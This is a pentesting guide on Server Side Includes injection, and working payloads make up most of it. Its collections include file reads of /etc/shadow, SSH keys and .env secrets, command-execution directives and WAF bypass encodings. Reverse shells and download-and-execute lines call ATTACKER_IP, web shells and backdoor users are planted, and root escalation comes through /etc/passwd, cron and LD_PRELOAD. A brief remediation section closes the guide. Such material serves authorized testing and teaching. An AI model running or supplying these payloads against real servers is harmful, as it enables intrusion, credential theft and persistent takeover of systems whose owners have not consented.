---
title: Server Side Includes (SSI) Injection
description: Complete guide to SSI Injection — payloads, detection, exploitation methodology, privilege escalation, and defense techniques for penetration testers and security researchers.
navigation:
  icon: i-lucide-syringe
  title: SSI Injection
---

## What is Server Side Includes (SSI)?

Server Side Includes (SSI) is a simple interpreted server-side scripting language used to generate dynamic content on web pages **before** they are served to the client. SSI directives are embedded directly into HTML pages using special comment syntax and are parsed by the web server (typically Apache HTTP Server, Nginx, or IIS).

SSI files commonly use extensions such as `.shtml`, `.stm`, `.shtm`, or `.html` when the server is configured to parse all HTML files.

::callout{icon="i-lucide-info" color="blue"}
SSI directives are processed **server-side** before the page reaches the browser. This means the client never sees the directive — only the output.
::

The basic SSI syntax follows this pattern:

```html
<!--#directive parameter="value" -->
```

::tabs
  :::tabs-item{icon="i-lucide-eye" label="How SSI Works"}
  When a user requests a `.shtml` page, the web server scans the file for SSI directives. Each directive is **executed on the server** and replaced with its output. The final rendered HTML is then sent to the client.

  This means if an attacker can inject SSI directives into a page that gets parsed, they achieve **server-side code execution**.
  :::

  :::tabs-item{icon="i-lucide-code" label="Basic SSI Example"}
  ```html
  <html>
  <body>
  <h1>Welcome</h1>
  <!-- This SSI directive prints the current date -->
  <!--#echo var="DATE_LOCAL" -->

  <!-- This includes another file -->
  <!--#include virtual="/footer.html" -->
  </body>
  </html>
  ```
  :::
::

---

## How SSI Injection Works

SSI Injection occurs when user-supplied input is embedded into a server-parsed page **without proper sanitization**. If the web server is configured to process SSI directives, the attacker's injected directive will be executed on the server.

::steps{level="4"}

#### Identify Input Reflection

The attacker locates an input field (search box, form field, URL parameter, HTTP header) whose value is reflected in a `.shtml` page or a page processed for SSI.

#### Inject SSI Directive

The attacker submits a crafted SSI directive as input.

```html
<!--#echo var="DATE_LOCAL" -->
```

#### Server Parses the Directive

The web server encounters the injected directive during page rendering and **executes it server-side**.

#### Output Returned to Attacker

The result of the executed directive is embedded in the HTTP response returned to the attacker, confirming code execution.

::

::warning
SSI Injection is often **underestimated** because SSI is considered legacy technology. However, many production servers still process SSI directives, especially older Apache and IIS deployments.
::

---

## Detection & Identification

Before injecting payloads, you must determine if the target server processes SSI.

::card-group
  ::card
  ---
  title: File Extension Check
  icon: i-lucide-file-search
  ---
  Look for pages with `.shtml`, `.stm`, `.shtm` extensions. These are strong indicators that SSI is enabled.
  ::

  ::card
  ---
  title: Server Header Analysis
  icon: i-lucide-server
  ---
  Check `Server` response headers. Apache with `mod_include` or IIS with SSI enabled are prime targets.
  ::

  ::card
  ---
  title: Input Reflection Testing
  icon: i-lucide-text-cursor-input
  ---
  Submit benign SSI syntax in input fields and observe if the output changes or the directive is processed.
  ::

  ::card
  ---
  title: Error-Based Detection
  icon: i-lucide-alert-triangle
  ---
  Inject malformed SSI directives. If the server returns SSI-specific error messages, parsing is enabled.
  ::
::

### Detection Payloads

These payloads help confirm whether SSI processing is active on the target.

::code-group
```html [Date Echo Test]
<!--#echo var="DATE_LOCAL" -->
```

```html [Document Name Test]
<!--#echo var="DOCUMENT_NAME" -->
```

```html [Server Software Test]
<!--#echo var="SERVER_SOFTWARE" -->
```

```html [Malformed Directive Test]
<!--#invalid_directive -->
```
::

::tip
If the server returns the **current date**, **filename**, or **server software version** instead of rendering the raw directive text, SSI is enabled and injectable.
::

---

## Payloads

::note
All payloads below are organized by category. Each payload is designed for direct injection into input fields, URL parameters, or any reflection point processed by the SSI engine.
::

### Information Disclosure Payloads

These payloads extract server environment variables and configuration details.

::collapsible
---
label: "Environment Variable Extraction"
---

```html [Current Date & Time]
<!--#echo var="DATE_LOCAL" -->
```

```html [Current GMT Date]
<!--#echo var="DATE_GMT" -->
```

```html [Document Filename]
<!--#echo var="DOCUMENT_NAME" -->
```

```html [Document URI Path]
<!--#echo var="DOCUMENT_URI" -->
```

```html [Last Modified Date]
<!--#echo var="LAST_MODIFIED" -->
```

```html [Server Software]
<!--#echo var="SERVER_SOFTWARE" -->
```

```html [Server Name]
<!--#echo var="SERVER_NAME" -->
```

```html [Server Port]
<!--#echo var="SERVER_PORT" -->
```

```html [Server Protocol]
<!--#echo var="SERVER_PROTOCOL" -->
```

```html [Gateway Interface]
<!--#echo var="GATEWAY_INTERFACE" -->
```

```html [Remote Address (Client IP)]
<!--#echo var="REMOTE_ADDR" -->
```

```html [Remote Host]
<!--#echo var="REMOTE_HOST" -->
```

```html [Request Method]
<!--#echo var="REQUEST_METHOD" -->
```

```html [Query String]
<!--#echo var="QUERY_STRING" -->
```

```html [HTTP User Agent]
<!--#echo var="HTTP_USER_AGENT" -->
```

```html [HTTP Referer]
<!--#echo var="HTTP_REFERER" -->
```

```html [HTTP Accept]
<!--#echo var="HTTP_ACCEPT" -->
```

```html [HTTP Cookie]
<!--#echo var="HTTP_COOKIE" -->
```

```html [Script Filename]
<!--#echo var="SCRIPT_FILENAME" -->
```

```html [Document Root]
<!--#echo var="DOCUMENT_ROOT" -->
```

```html [PATH Variable]
<!--#echo var="PATH" -->
```

```html [All Variables (Apache)]
<!--#printenv -->
```
::

### File Inclusion Payloads

These payloads include local files into the rendered page, enabling **Local File Inclusion (LFI)** through SSI.

::collapsible
---
label: "Local File Read Payloads"
---

```html [/etc/passwd (Linux)]
<!--#include virtual="/etc/passwd" -->
```

```html [/etc/shadow (Linux - if readable)]
<!--#include virtual="/etc/shadow" -->
```

```html [/etc/hosts]
<!--#include virtual="/etc/hosts" -->
```

```html [/etc/hostname]
<!--#include virtual="/etc/hostname" -->
```

```html [/etc/issue]
<!--#include virtual="/etc/issue" -->
```

```html [/proc/version]
<!--#include virtual="/proc/version" -->
```

```html [/proc/self/environ]
<!--#include virtual="/proc/self/environ" -->
```

```html [/proc/self/cmdline]
<!--#include virtual="/proc/self/cmdline" -->
```

```html [/proc/net/tcp]
<!--#include virtual="/proc/net/tcp" -->
```

```html [Apache Config]
<!--#include virtual="/etc/apache2/apache2.conf" -->
```

```html [Nginx Config]
<!--#include virtual="/etc/nginx/nginx.conf" -->
```

```html [SSH Authorized Keys]
<!--#include virtual="/root/.ssh/authorized_keys" -->
```

```html [SSH Private Key]
<!--#include virtual="/root/.ssh/id_rsa" -->
```

```html [Crontab]
<!--#include virtual="/etc/crontab" -->
```

```html [Windows hosts file]
<!--#include virtual="C:\Windows\System32\drivers\etc\hosts" -->
```

```html [Windows win.ini]
<!--#include virtual="C:\Windows\win.ini" -->
```

```html [Include with file directive]
<!--#include file="../../etc/passwd" -->
```

```html [Application Config File]
<!--#include virtual="/var/www/html/config.php" -->
```

```html [.env File]
<!--#include virtual="/var/www/html/.env" -->
```

```html [Web.config (IIS)]
<!--#include file="web.config" -->
```
::

### Remote Code Execution Payloads

These are the most critical payloads. They use the `exec` directive to run **arbitrary OS commands** on the server.

::caution
These payloads execute commands directly on the target server. Use only in authorized penetration testing engagements.
::

::collapsible
---
label: "Command Execution — Linux"
---

```html [Basic Command Execution (cmd)]
<!--#exec cmd="id" -->
```

```html [Whoami]
<!--#exec cmd="whoami" -->
```

```html [Current Directory]
<!--#exec cmd="pwd" -->
```

```html [List Files]
<!--#exec cmd="ls -la" -->
```

```html [List Root Directory]
<!--#exec cmd="ls -la /" -->
```

```html [Read /etc/passwd]
<!--#exec cmd="cat /etc/passwd" -->
```

```html [Read /etc/shadow]
<!--#exec cmd="cat /etc/shadow" -->
```

```html [Network Configuration]
<!--#exec cmd="ifconfig" -->
```

```html [IP Address]
<!--#exec cmd="ip addr" -->
```

```html [Routing Table]
<!--#exec cmd="route -n" -->
```

```html [ARP Table]
<!--#exec cmd="arp -a" -->
```

```html [Active Connections]
<!--#exec cmd="netstat -tulnp" -->
```

```html [Running Processes]
<!--#exec cmd="ps aux" -->
```

```html [Kernel Version]
<!--#exec cmd="uname -a" -->
```

```html [OS Release]
<!--#exec cmd="cat /etc/os-release" -->
```

```html [Disk Usage]
<!--#exec cmd="df -h" -->
```

```html [Mounted Filesystems]
<!--#exec cmd="mount" -->
```

```html [Find SUID Binaries]
<!--#exec cmd="find / -perm -4000 -type f 2>/dev/null" -->
```

```html [Find World-Writable Files]
<!--#exec cmd="find / -writable -type f 2>/dev/null" -->
```

```html [Crontab List]
<!--#exec cmd="crontab -l" -->
```

```html [Environment Variables]
<!--#exec cmd="env" -->
```

```html [Sudo Permissions]
<!--#exec cmd="sudo -l" -->
```

```html [Installed Packages (Debian)]
<!--#exec cmd="dpkg -l" -->
```

```html [Installed Packages (RHEL)]
<!--#exec cmd="rpm -qa" -->
```

```html [DNS Resolution]
<!--#exec cmd="cat /etc/resolv.conf" -->
```

```html [Check for Docker]
<!--#exec cmd="cat /proc/1/cgroup" -->
```
::

::collapsible
---
label: "Command Execution — Windows"
---

```html [Whoami (Windows)]
<!--#exec cmd="whoami" -->
```

```html [System Info]
<!--#exec cmd="systeminfo" -->
```

```html [IP Config]
<!--#exec cmd="ipconfig /all" -->
```

```html [Directory Listing]
<!--#exec cmd="dir C:\" -->
```

```html [User List]
<!--#exec cmd="net user" -->
```

```html [Local Groups]
<!--#exec cmd="net localgroup administrators" -->
```

```html [Active Connections]
<!--#exec cmd="netstat -an" -->
```

```html [Running Processes]
<!--#exec cmd="tasklist" -->
```

```html [Hostname]
<!--#exec cmd="hostname" -->
```

```html [Scheduled Tasks]
<!--#exec cmd="schtasks /query" -->
```

```html [Firewall Rules]
<!--#exec cmd="netsh firewall show state" -->
```

```html [Read Windows File]
<!--#exec cmd="type C:\Windows\win.ini" -->
```
::

### Reverse Shell Payloads

::collapsible
---
label: "Reverse Shell via SSI"
---

```html [Bash Reverse Shell]
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" -->
```

```html [Netcat Reverse Shell]
<!--#exec cmd="nc -e /bin/sh ATTACKER_IP 4444" -->
```

```html [Netcat without -e]
<!--#exec cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f" -->
```

```html [Python Reverse Shell]
<!--#exec cmd="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" -->
```

```html [Python3 Reverse Shell]
<!--#exec cmd="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" -->
```

```html [Perl Reverse Shell]
<!--#exec cmd="perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" -->
```

```html [PHP Reverse Shell]
<!--#exec cmd="php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -->
```

```html [Curl Download & Execute]
<!--#exec cmd="curl http://ATTACKER_IP/shell.sh | bash" -->
```

```html [Wget Download & Execute]
<!--#exec cmd="wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh" -->
```

```html [PowerShell Reverse Shell (Windows)]
<!--#exec cmd="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" -->
```
::

### Filter Bypass Payloads

When basic SSI directives are blocked by WAFs or input filters, use these evasion techniques.

::collapsible
---
label: "WAF & Filter Bypass Techniques"
---

```html [Case Variation]
<!--#EXEC cmd="id" -->
```

```html [Mixed Case]
<!--#Exec Cmd="id" -->
```

```html [Tab Characters]
<!--#exec	cmd="id"	-->
```

```html [Extra Spaces]
<!--#exec  cmd="id"  -->
```

```html [Newline Injection]
<!--#exec
cmd="id" -->
```

```html [URL Encoded (inject via parameter)]
%3C%21--%23exec%20cmd%3D%22id%22%20--%3E
```

```html [Double URL Encoded]
%253C%2521--%2523exec%2520cmd%253D%2522id%2522%2520--%253E
```

```html [HTML Entity Encoded]
&lt;!--#exec cmd="id" --&gt;
```

```html [Unicode Encoding]
\u003c!--#exec cmd="id" --\u003e
```

```html [Null Byte Injection]
<!--#exec cmd="id" -->%00
```

```html [Backtick Command Substitution]
<!--#exec cmd="`id`" -->
```

```html [Variable Assignment Bypass]
<!--#set var="cmd" value="id" --><!--#echo var="cmd" -->
```

```html [Using CGI exec]
<!--#exec cgi="/cgi-bin/cmd.cgi" -->
```

```html [Path Traversal in Include]
<!--#include virtual="/../../../etc/passwd" -->
```

```html [Using flastmod directive]
<!--#flastmod virtual="/etc/passwd" -->
```

```html [Using fsize directive]
<!--#fsize virtual="/etc/passwd" -->
```

```html [Config directive to change error message]
<!--#config errmsg="SSI_WORKS" --><!--#invalid -->
```

```html [Config time format (confirmation)]
<!--#config timefmt="%Y-%m-%d %H:%M:%S" --><!--#echo var="DATE_LOCAL" -->
```
::

### Web Shell via SSI

::collapsible
---
label: "Persistent Web Shell Payloads"
---

```html [Write PHP Web Shell]
<!--#exec cmd="echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php" -->
```

```html [Write to writable directory]
<!--#exec cmd="echo '<?php passthru($_REQUEST[\"cmd\"]); ?>' > /tmp/shell.php" -->
```

```html [Write JSP Web Shell]
<!--#exec cmd="echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /var/www/html/cmd.jsp" -->
```

```html [Download web shell from attacker]
<!--#exec cmd="wget http://ATTACKER_IP/webshell.php -O /var/www/html/ws.php" -->
```

```html [Create SSH backdoor]
<!--#exec cmd="echo 'ATTACKER_SSH_PUBLIC_KEY' >> /root/.ssh/authorized_keys" -->
```

```html [Add user (if root)]
<!--#exec cmd="useradd -m -s /bin/bash -G sudo hacker && echo 'hacker:password123' | chpasswd" -->
```
::

---

## Privilege Escalation via SSI Injection

::note
SSI Injection can serve as an **initial access vector** that leads directly to privilege escalation. The web server process context and system misconfigurations determine the escalation path.
::

### Understanding the Execution Context

When an SSI directive executes a command, it runs as the **web server user**. This is the starting point for all privilege escalation.

| Web Server | Default User | Platform |
|-----------|-------------|----------|
| Apache | `www-data` or `apache` | Linux |
| Nginx | `www-data` or `nginx` | Linux |
| IIS | `IIS APPPOOL\DefaultAppPool` | Windows |
| LiteSpeed | `nobody` or `lsadm` | Linux |

### PrivEsc Enumeration Payloads

::steps{level="4"}

#### Identify Current User & Permissions

```html
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="groups" -->
```

These reveal the current user, UID/GID, and group memberships. Look for membership in `sudo`, `docker`, `lxd`, `disk`, or `adm` groups.

#### Check Sudo Permissions

```html
<!--#exec cmd="sudo -l 2>&1" -->
```

If the web server user has **NOPASSWD** sudo entries, you can escalate immediately.

::tip
If `sudo -l` returns entries like `(ALL) NOPASSWD: /usr/bin/vim` or similar, check [GTFOBins](https://gtfobins.github.io/) for exploitation.
::

#### Find SUID/SGID Binaries

```html
<!--#exec cmd="find / -perm -4000 -type f 2>/dev/null" -->
<!--#exec cmd="find / -perm -2000 -type f 2>/dev/null" -->
```

SUID binaries run with the **owner's privileges** (often root). Exploitable SUID binaries include:

| Binary | Exploitation |
|--------|-------------|
| `/usr/bin/find` | `find . -exec /bin/sh -p \;` |
| `/usr/bin/vim` | `:!sh` inside vim |
| `/usr/bin/python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `/usr/bin/nmap` | `nmap --interactive` → `!sh` |
| `/usr/bin/env` | `env /bin/sh -p` |
| `/usr/bin/bash` | `bash -p` |
| `/usr/bin/cp` | Overwrite `/etc/passwd` |

#### Examine Cron Jobs

```html
<!--#exec cmd="cat /etc/crontab" -->
<!--#exec cmd="ls -la /etc/cron.d/" -->
<!--#exec cmd="ls -la /etc/cron.daily/" -->
<!--#exec cmd="ls -la /var/spool/cron/crontabs/" -->
<!--#exec cmd="cat /var/spool/cron/crontabs/root 2>/dev/null" -->
```

Look for cron jobs running as **root** that execute **writable scripts**.

#### Check Writable Files & Directories

```html
<!--#exec cmd="find / -writable -type f 2>/dev/null | grep -v proc" -->
<!--#exec cmd="find /etc -writable -type f 2>/dev/null" -->
```

Writable files in sensitive locations (`/etc/passwd`, `/etc/crontab`, service configs) enable direct escalation.

#### Check for Capabilities

```html
<!--#exec cmd="getcap -r / 2>/dev/null" -->
```

Linux capabilities can grant root-like powers to specific binaries. Look for:

| Capability | Risk |
|-----------|------|
| `cap_setuid+ep` | Can change UID to root |
| `cap_dac_override+ep` | Can read/write any file |
| `cap_net_raw+ep` | Can sniff network traffic |
| `cap_sys_admin+ep` | Full admin capabilities |

#### Check for Docker/LXD Access

```html
<!--#exec cmd="docker images 2>/dev/null" -->
<!--#exec cmd="lxc image list 2>/dev/null" -->
<!--#exec cmd="id | grep -i docker" -->
```

If the web user is in the `docker` or `lxd` group, full root access is trivial.

#### Read Sensitive Configuration Files

```html
<!--#exec cmd="cat /var/www/html/.env 2>/dev/null" -->
<!--#exec cmd="cat /var/www/html/wp-config.php 2>/dev/null" -->
<!--#exec cmd="cat /var/www/html/config/database.yml 2>/dev/null" -->
<!--#exec cmd="cat /etc/mysql/debian.cnf 2>/dev/null" -->
<!--#exec cmd="find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | head -20" -->
```

Database credentials and API keys found in config files can be reused for SSH or database access leading to escalation.

#### Check Kernel Version for Exploits

```html
<!--#exec cmd="uname -a" -->
<!--#exec cmd="cat /proc/version" -->
<!--#exec cmd="cat /etc/os-release" -->
```

Compare the kernel version against known privilege escalation exploits.

::

### PrivEsc Exploitation Payloads

Once enumeration reveals a path, use these payloads to escalate.

::collapsible
---
label: "Direct Escalation Payloads"
---

```html [Writable /etc/passwd — Add Root User]
<!--#exec cmd="echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd" -->
```

```html [Writable Cron — Root Reverse Shell]
<!--#exec cmd="echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /etc/crontab" -->
```

```html [SUID Bash Exploitation]
<!--#exec cmd="cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" -->
```

Then access:
```bash
/tmp/rootbash -p
```

```html [Docker Group — Mount Root FS]
<!--#exec cmd="docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c 'echo hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash >> /etc/passwd'" -->
```

```html [Writable Service File]
<!--#exec cmd="echo '[Service]\nType=oneshot\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1\"' > /etc/systemd/system/pwned.service" -->
```

```html [Python with cap_setuid]
<!--#exec cmd="/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" -->
```

```html [Sudo NOPASSWD Vim]
<!--#exec cmd="sudo vim -c ':!bash'" -->
```

```html [LD_PRELOAD Exploitation (if sudo allows)]
<!--#exec cmd="echo '#include <stdio.h>\n#include <stdlib.h>\nvoid _init(){setuid(0);setgid(0);system(\"/bin/bash -p\");}' > /tmp/pe.c && gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c && sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find" -->
```
::

### PrivEsc Flow Diagram

::card-group
  ::card
  ---
  title: "Step 1 → Initial Access"
  icon: i-lucide-log-in
  ---
  SSI Injection achieves command execution as the **web server user** (`www-data`, `apache`, etc.)
  ::

  ::card
  ---
  title: "Step 2 → Enumerate"
  icon: i-lucide-search
  ---
  Run enumeration payloads to discover SUID binaries, sudo rules, cron jobs, capabilities, writable files, and credentials.
  ::

  ::card
  ---
  title: "Step 3 → Identify Path"
  icon: i-lucide-route
  ---
  Analyze enumeration output. Match findings to known escalation techniques (GTFOBins, kernel exploits, misconfigurations).
  ::

  ::card
  ---
  title: "Step 4 → Escalate"
  icon: i-lucide-arrow-up-circle
  ---
  Execute the appropriate escalation payload. Obtain root shell or root-level file access.
  ::
::

---

## Attack Methodology

A structured approach to SSI Injection testing.

::steps{level="3"}

### Reconnaissance

Identify SSI-enabled pages, input reflection points, and server technology.

::field-group
  ::field{name="File Extensions" type="indicator"}
  Scan for `.shtml`, `.stm`, `.shtm` pages using directory brute-forcing tools.
  ::

  ::field{name="Server Headers" type="indicator"}
  Check `Server` and `X-Powered-By` response headers for Apache, IIS, or Nginx.
  ::

  ::field{name="Input Reflection" type="indicator"}
  Map all input points (forms, URL parameters, headers, cookies) that reflect in responses.
  ::


### Confirmation

Inject a safe detection payload to confirm SSI processing.

```html
<!--#echo var="DATE_LOCAL" -->
```

If the response contains the **current server date** instead of the raw text, SSI is active.

### Exploitation

Escalate from information disclosure to command execution.

```html
<!--#exec cmd="id && whoami && uname -a" -->
```

### Post-Exploitation

Establish persistence, escalate privileges, and pivot.

```html
<!--#exec cmd="curl http://ATTACKER_IP/linpeas.sh | bash" -->
```

### Documentation

Record all findings, payloads used, and evidence for the penetration test report.


---

## Apache SSI Configuration Reference

Understanding Apache SSI configuration helps identify vulnerable setups and assists in remediation.

::collapsible
---
label: "Apache httpd.conf / .htaccess SSI Configuration"
---

```apache [Enabling SSI — httpd.conf]
# Load the include module
LoadModule include_module modules/mod_include.so

# Enable SSI for .shtml files
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml

# Enable SSI for ALL .html files (dangerous)
AddType text/html .html
AddOutputFilter INCLUDES .html
```

```apache [Directory Options]
<Directory "/var/www/html">
    Options +Includes
    AllowOverride All
</Directory>
```

```apache [Enabling exec (DANGEROUS)]
<Directory "/var/www/html">
    Options +Includes +ExecCGI
</Directory>
```

```apache [Disabling exec (SECURE)]
<Directory "/var/www/html">
    Options +IncludesNOEXEC
</Directory>
```
::

::warning
The critical difference between `+Includes` and `+IncludesNOEXEC` is that `IncludesNOEXEC` **disables the `exec` directive**, preventing command execution while still allowing `echo` and `include`.
::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Input Validation
  icon: i-lucide-shield-check
  ---
  Strip or encode SSI directive characters (`<!--`, `-->`, `#`) from all user input before embedding in server-parsed pages.
  ::

  ::card
  ---
  title: Use IncludesNOEXEC
  icon: i-lucide-shield
  ---
  Configure Apache with `Options +IncludesNOEXEC` to allow SSI includes but **block command execution**.
  ::

  ::card
  ---
  title: Disable SSI
  icon: i-lucide-shield-off
  ---
  If SSI is not required, disable it entirely by removing `mod_include` and SSI-related directives.
  ::

  ::card
  ---
  title: Least Privilege
  icon: i-lucide-lock
  ---
  Run the web server under a **dedicated low-privilege user** with no sudo access, no sensitive group memberships, and restricted filesystem permissions.
  ::

  ::card
  ---
  title: WAF Rules
  icon: i-lucide-brick-wall
  ---
  Deploy WAF rules to detect and block SSI directive patterns in HTTP requests.
  ::

  ::card
  ---
  title: Content Security Policy
  icon: i-lucide-file-lock
  ---
  Implement strong CSP headers and avoid reflecting unsanitized user input in any server-parsed page.
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and modify HTTP requests to inject SSI payloads in headers, parameters, and body fields.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fuzz input parameters with SSI payloads wordlists to identify injection points.
  ::

  ::card
  ---
  title: Nikto
  icon: i-lucide-scan
  to: https://github.com/sullo/nikto
  target: _blank
  ---
  Web scanner that can detect SSI-enabled pages and common misconfigurations.
  ::

  ::card
  ---
  title: wfuzz
  icon: i-lucide-terminal
  to: https://github.com/xmendez/wfuzz
  target: _blank
  ---
  Web fuzzer for brute-forcing parameters with SSI injection payloads.
  ::

  ::card
  ---
  title: GTFOBins
  icon: i-lucide-key
  to: https://gtfobins.github.io/
  target: _blank
  ---
  Reference for exploiting SUID binaries, sudo misconfigurations, and capabilities for privilege escalation.
  ::

  ::card
  ---
  title: LinPEAS
  icon: i-lucide-search-code
  to: https://github.com/peass-ng/PEASS-ng
  target: _blank
  ---
  Linux privilege escalation enumeration script. Execute through SSI `exec` to automate enumeration.
  ::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: OWASP — SSI Injection
  icon: i-lucide-book-open
  to: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
  target: _blank
  ---
  Official OWASP documentation covering SSI Injection attack vectors, examples, and prevention.
  ::

  ::card
  ---
  title: Apache mod_include Documentation
  icon: i-lucide-file-text
  to: https://httpd.apache.org/docs/current/mod/mod_include.html
  target: _blank
  ---
  Official Apache documentation for the `mod_include` module covering all SSI directives and configuration.
  ::

  ::card
  ---
  title: HackTricks — SSI Injection
  icon: i-lucide-graduation-cap
  to: https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
  target: _blank
  ---
  Comprehensive pentesting reference for SSI and ESI injection techniques with practical examples.
  ::

  ::card
  ---
  title: PortSwigger — Server-Side Template Injection
  icon: i-lucide-globe
  to: https://portswigger.net/web-security/server-side-template-injection
  target: _blank
  ---
  Related research on server-side injection techniques including SSI context from PortSwigger.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — SSI
  icon: i-lucide-list
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
  target: _blank
  ---
  Community-maintained payload repository with SSI injection payloads and bypass techniques.
  ::

  ::card
  ---
  title: CWE-97 — Server-Side Includes
  icon: i-lucide-bookmark
  to: https://cwe.mitre.org/data/definitions/97.html
  target: _blank
  ---
  MITRE CWE entry for improper neutralization of SSI directives in web pages.
  ::
::